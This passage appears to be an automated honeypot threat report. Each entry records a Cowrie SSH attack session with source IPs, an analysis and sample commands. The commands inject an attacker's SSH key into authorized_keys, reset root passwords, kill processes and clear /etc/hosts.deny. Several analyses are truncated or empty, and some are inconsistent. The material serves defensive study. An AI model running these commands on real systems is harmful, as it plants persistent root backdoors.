- SSH key in authorized_keys: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- File paths manipulated: `~/.ssh`, `/tmp/secure.sh`, `/tmp/auth.sh`, `/etc/hosts.deny`.  
**Threat Level:** Medium – moderate sophistication with potential for remote control.  
**Brief Summary:** The attacker injected an SSH key into the honeypot’s authorized_keys, attempted to alter the root password, and performed system reconnaissance, indicating a backdoor installation attempt.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:x2yW2PVhz9sj"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 206fe519c0e9...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.91.246.101

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain remote access (SSH) with elevated privileges (root).  
**Techniques:**  
- **SSH Key Injection** – `mkdir .ssh` + `echo … > ~/.ssh/authorized_keys`  
- **Root Password Change** – `echo "root:af1HAFRHCPKB"|chpasswd|bash`  
- **Process & File Manipulation** – `pkill -9`, `rm -rf`, `echo > /etc/hosts.deny`  
- **System Reconnaissance** – CPU, memory, uptime, crontab, user info.

**Indicators of Compromise (IOCs):**  
- Attacker IP: 103.91.246.101  
- Public SSH key string in command 3 (`ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`)  
- File paths: `~/.ssh/authorized_keys`, `/etc/hosts.deny`  

**Threat Level:** **High** – attacker is attempting to install a persistent backdoor with root access.  

**Brief Summary:** The session shows an attacker injecting an SSH key and altering the root password to establish a remote backdoor, while gathering system information for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:af1HAFRHCPKB"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: f3f8f0489edc...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.143.238.207

#### Analysis

**Attack Type:** Backdoor installation / SSH key injection  
**Objective:** Gain privileged (root) access to the honeypot via SSH.  
**Techniques:**  
- Manipulated `.ssh` directory (`chattr`, `lockr`, `rm -rf`, `mkdir`) and injected a public‑key into `authorized_keys`.  
- Reset root password with `chpasswd`.  
- Disrupted system processes (`pkill`, `echo > /etc/hosts.deny`).  
- Executed system‑info commands for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **103.143.238.207** (Hong Kong)  
- SSH public key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- Root password: `"1kn8LvvRLbUi"`  

**Threat Level:** Medium – moderate sophistication with direct credential manipulation.  

**Brief Summary:** The attacker injected an SSH key and reset the root password to establish a backdoor, while also attempting to disrupt system processes and gather basic system information.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:1kn8LvvRLbUi"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: a735a1caa5e4...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.219.22

#### Analysis

**Attack Type:** Backdoor installation (remote access via SSH)

**Objective:** Gain privileged remote control of the host by creating an authorized SSH key and resetting the root password.

**Techniques & Tools:**
- `chattr`/`lockr` to lock `.ssh` directory
- Creation of `.ssh/authorized_keys` with a hard‑coded RSA public key
- `chpasswd` to set root password (`root:Xdck9yLaqztK`)
- Killing and removing temporary scripts/processes (`pkill -9`, `rm -rf /tmp/...`)
- System reconnaissance commands (CPU, memory, uptime, etc.) for gathering host info

**Indicators of Compromise (IOCs):**
- Attacker IP: **45.78.219.22**  
- RSA public key string in `/ssh/authorized_keys`  
- Root password hash (`root:Xdck9yLaqztK`)  

**Threat Level:** High – the attacker has established a persistent backdoor with full root privileges.

**Brief Summary:** The session shows an attacker installing a backdoor by injecting an SSH key and resetting the root password, enabling remote privileged access to the system.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:Xdck9yLaqztK"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: adeb4eb2c3fa...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 116.193.191.100

#### Analysis

**Attack Type:** Backdoor installation (botnet recruitment)

**Objective:** Gain persistent remote access via SSH, likely to use the compromised host as a bot or malicious node.

**Techniques:**
- Injected an SSH public key into `~/.ssh/authorized_keys` and set restrictive permissions.
- Changed root password (`root:PL047AT0BQgb`) to facilitate privileged access.
- Removed temporary scripts and killed processes (`secure.sh`, `auth.sh`, `sleep`) to hide activity.
- Denied hosts via `/etc/hosts.deny`.
- Collected system information (CPU, memory, architecture) for profiling.

**Indicators of Compromise (IOCs):**
- Attacker IP: **116.193.191.100**  
- SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- Files manipulated: `~/.ssh`, `authorized_keys`, `/etc/hosts.deny`.

**Threat Level:** **High** – the attacker achieved privileged access and set up a persistent backdoor.

**Brief Summary:** The attacker installed an SSH key, changed root credentials, and hidden processes to establish a remote backdoor on the host, enabling future malicious activity.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:PL047AT0BQgb"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 24edaeeb27e0...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 212.154.234.9

#### Analysis

**Attack Type:** Backdoor installation / credential injection  
**Objective:** Gain remote privileged access (root) via SSH and gather system information for reconnaissance.  

**Techniques & Tools:**
- **SSH key injection** – created a new `.ssh/authorized_keys` file with a malicious RSA key.
- **Root password change** – `chpasswd` to set root password (`cWNPG

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:cWNPGZJxiu77"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 3cc95aa072ec...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 20.12.41.6

#### Analysis

**Attack Type:**  
Backdoor installation (remote access via SSH key injection)

**Objective:**  
Gain persistent, unauthorized SSH access to the honeypot host and gather system information for further exploitation.

**Techniques & Tools Used:**
- `chattr -ia` / `lockr -ia` – attempt to lock the `.ssh` directory.
- `rm -rf .ssh`, `mkdir .ssh` – reset the SSH configuration.
- `echo … > ~/.ssh/authorized_keys` – inject a malicious public key.
- `chmod -R go= ~/.ssh` – restrict permissions.
- System‑info commands (`cat /proc/cpuinfo`, `free -m`, `ls`, `uname`, `top`, etc.) for reconnaissance.

**Indicators of Compromise (IOCs):**
- **IP:** 20.12.41.6  
- **SSH Public Key:** `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- **File:** `~/.ssh/authorized_keys`

**Threat Level:** High – the attacker successfully installed a backdoor and performed reconnaissance, indicating potential for further exploitation.

**Brief Summary:**  
The attacker injected a malicious SSH key into the honeypot’s authorized keys, enabling remote access while collecting system information for future attacks.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123\nZfRwcf14U0Ok\nZfRwcf14U0Ok"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123\nZfRwcf14U0Ok\nZfRwcf14U0Ok\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 9f7b26c425ff...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.47.163.114

#### Analysis

**1. Attack Type:**  
Backdoor installation / credential theft (SSH key injection + root password modification).

**2. Objective:**  
Gain persistent remote access to the host via SSH and elevate privileges by setting a new root password.

**3. Techniques & Tools Used:**
- `chattr -ia` and `lockr` to lock `.ssh` directory.
- `rm -rf .ssh && mkdir .ssh` followed by `echo … > ~/.ssh/authorized_keys` to inject an SSH key.
- `chmod -R go= ~/.ssh` to restrict permissions.
- `chpasswd` piped with a root password (`root:s58KPtvwsnrm`) to change the root account.
- Process killing (`pkill -9 secure.sh`, `pkill -9 auth.sh`, `pkill -9 sleep`) and cleanup of temporary files.
- System reconnaissance commands (CPU, memory, disk usage, uname, crontab, w).

**4. Indicators of Compromise (IOCs):**
- **SSH Key:** `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2l

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:s58KPtvwsnrm"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 03edd1355eed...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 201.76.120.30

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain full root access by injecting an SSH key and resetting the root password.  
**Techniques:**  
- `chattr -ia` & `lockr` to lock `.ssh` directory (prevent tampering).  
- Removal of existing `.ssh`, creation of new one, injection of a malicious RSA key (`ssh-rsa … mdrfckr`).  
- `

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:C0MiFBUmk1fE"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 5b670d811642...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.204.252

#### Analysis



#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:L25OCNWi1xXO"|chpasswd|bash
crontab -l
w
uname -m
cat /proc/cpuinfo | grep model | grep name | wc -l
top
... (+5 more)
```

---

### Pattern: 26749b1bbc64...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 20.12.41.6

#### Analysis

**1. Attack Type:**  
Backdoor installation via SSH key injection (remote access setup).

**2. Objective:**  
Gain persistent remote control over the target machine by adding a malicious SSH public key to `~/.ssh/authorized_keys` and then gathering system information for potential exploitation.

**3. Techniques & Tools Used:**
- **SSH Key Injection:** `echo … > ~/.ssh/authorized_keys` with a hard‑coded RSA key.
- **Directory Manipulation & Hiding:** `chattr -ia .ssh`, `lockr -ia .ssh` to make the `.ssh` directory immutable and hidden.
- **Permission Restriction:** `chmod -R go= ~/.ssh`.
- **System Reconnaissance Commands:** `cat /proc/cpuinfo`, `free -m`, `ls`, `crontab -l`, `w`, `uname`, `top`, `whoami`, `lscpu`, `df`.

**4. Indicators of Compromise (IOCs):**
- Attacker IP: **20.12.41.6**  
- Public SSH key string:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
  ```

**5. Threat Level:**  
Medium – the attacker demonstrates moderate sophistication (SSH key injection, directory manipulation) but does not deploy additional payloads or malware.

**6. Brief Summary:**  
The attacker injected a malicious SSH public key into the target’s `.ssh` directory and performed system reconnaissance to establish remote access and gather information for potential exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "red\nO124vrw4H3qv\nO124vrw4H3qv"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "red\nO124vrw4H3qv\nO124vrw4H3qv\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: fcf620e29df2...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 201.76.120.30

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain persistent SSH access and elevate to root privileges on the target system.  
**Techniques:**  
- Injected an RSA public key into `~/.ssh/authorized_keys` (via `echo … > .ssh/authorized_keys`).  
- Changed the root password using `chpasswd`.  
- Cleaned up temporary files and killed processes (`pkill -9`) to hide activity.  
- Executed system‑info commands (CPU, memory, disk) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **201.76.120.30** (Brazil).  
- SSH public key string in the `authorized_keys` file (`ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`).  
- Root password hash (not shown, but changed via `chpasswd`).  

**Threat Level:** **High** – attacker has full root access and a persistent backdoor.  

**Brief Summary:** The attacker installed an SSH key and set the root password to gain full control of the system, while also attempting to conceal its activity by killing processes and cleaning temporary files.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:Z5fT8l0yQOQw"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: f73e8f752729...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 191.210.70.23

#### Analysis

**Attack Type:** Backdoor installation (botnet recruitment)

**Objective:** Gain persistent remote access by injecting an SSH public key into the host’s `authorized_keys` file, change the root password, and gather system information for profiling.

**Techniques:**
- **SSH Key Injection** – writes a hard‑coded RSA public key to `.ssh/authorized_keys`.
- **Root Password Modification** – uses `chpasswd` to set a new root password.
- **Immutable File Attributes** – `chattr -ia .ssh` and `lockr -ia .ssh` to prevent tampering.
- **System Reconnaissance** – commands querying CPU, memory, filesystem, crontab, uptime, etc.

**Indicators of Compromise (IOCs):**
- IP: 191.210.70.23
- Public key string in `authorized_keys`:  
  `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`
- File modifications: `.ssh`, `authorized_keys`, `/tmp/secure.sh`, `/tmp/auth.sh`.

**Threat Level:** **High** – root password change and SSH key injection provide full privileged access, enabling persistent exploitation.

**Brief Summary:** The attacker injected a hard‑coded SSH public key into the host’s authorized keys, changed the root password, and performed extensive system reconnaissance to establish a backdoor for remote control.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:xpyYlVCKxySb"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 48a1e0e9e875...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 102.220.23.226

#### Analysis

**1. Attack Type:**  
Backdoor installation (SSH key injection) combined with system reconnaissance.

**2. Objective:**  
Gain remote access to the target via a malicious SSH key while gathering system information for future exploitation or profiling.

**3. Techniques & Tools Used:**
- `chattr -ia .ssh` and `lockr -ia .ssh` – set immutable attributes to prevent deletion of the `.ssh` directory.
- Creation of a new `.ssh` directory, writing a long RSA public key into `authorized_keys`.
- `chmod -R go= ~/.ssh` – restrict permissions on the SSH directory.
- Attempts to change the local user password via `passwd` (interactive prompts).
- System information gathering: CPU info (`/proc/cpuinfo`), memory usage (`free`, `top`), OS details (`uname`, `whoami`), file system stats (`df`), and cron jobs (`crontab -l`).

**4. Indicators of Compromise (IOCs):**
- Attacker IP: **102.220.23.226**  
- Malicious SSH key string (the long RSA public key in the command).  
- File path: `~/.ssh/authorized_keys`.  
- Command usage: `lockr -ia .ssh` (potentially a custom tool or malware component).

**5. Threat Level:** Medium – the attacker successfully installed a backdoor, but no immediate exploitation is evident.

**6. Brief Summary:**  
The attacker injected an unauthorized SSH key into the honeypot’s `.ssh` directory and attempted to modify the local password while collecting system information for future use.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123qwe!@#\nqbco5Z9nQlY2\nqbco5Z9nQlY2"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123qwe!@#\nqbco5Z9nQlY2\nqbco5Z9nQlY2\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: d0ed203ce732...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 152.42.165.179

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection) combined with reconnaissance  
**Objective:** Gain remote access via a new SSH key and gather host information for future exploitation or monitoring.  

**Techniques Used:**  
- `chattr -ia` & `lockr -ia` to hide/lock the `.ssh` directory.  
- Creation of `.ssh/authorized_keys` with an RSA public key.  
- Permission changes (`chmod -R go= ~/.ssh`) to restrict access.  
- System‑info commands (`cat /proc/cpuinfo`, `free`, `top`, `uname`, etc.) for reconnaissance.

**Indicators of Compromise (IOCs):**  
- Attacker IP: **152.42.165.179** (Singapore)  
- RSA public key string in `.ssh/authorized_keys` (the long base‑64 string).  
- File names and paths: `.ssh`, `authorized_keys`.  

**Threat Level:** **High** – the attacker successfully installed a backdoor that allows persistent SSH access, potentially enabling further exploitation.  

**Brief Summary:** The attacker injected an SSH key into the honeypot’s `.ssh` directory while hiding it, then collected system information to assess the target environment for future attacks.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "red\nHIp4ifMy9tOE\nHIp4ifMy9tOE"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "red\nHIp4ifMy9tOE\nHIp4ifMy9tOE\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 322d660840af...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.201.208

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection + root password change) combined with system reconnaissance  
**Objective:** Gain persistent remote access to the target machine by adding an authorized SSH key and resetting the root password.  
**Techniques:**  
- `chattr`/`lockr` to lock `.ssh` directory,  
- `mkdir .ssh` & `echo … > ~/.ssh/authorized_keys` to inject a public key,  
- `chmod -R go= ~/.ssh` to restrict permissions,  
- `chpasswd` to set root password (`root:aJGC4Offo63j`),  
- Killing processes (`secure.sh`, `auth.sh`, `sleep`) and emptying `/etc/hosts.deny`.  
- System info commands (`cpuinfo`, `free`, `ls`, `crontab`, `w`, `uname`, etc.) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **45.78.201.208**  
- Public SSH key string in `.ssh/authorized_keys`  
- File paths: `/etc/hosts.deny`, `~/.ssh/authorized_keys`  

**Threat Level:** **High** – root password change and persistent SSH access pose significant risk.  

**Brief Summary:** The attacker injected an SSH public key, reset the root password, and performed system reconnaissance to establish a backdoor for future remote control.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:aJGC4Offo63j"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
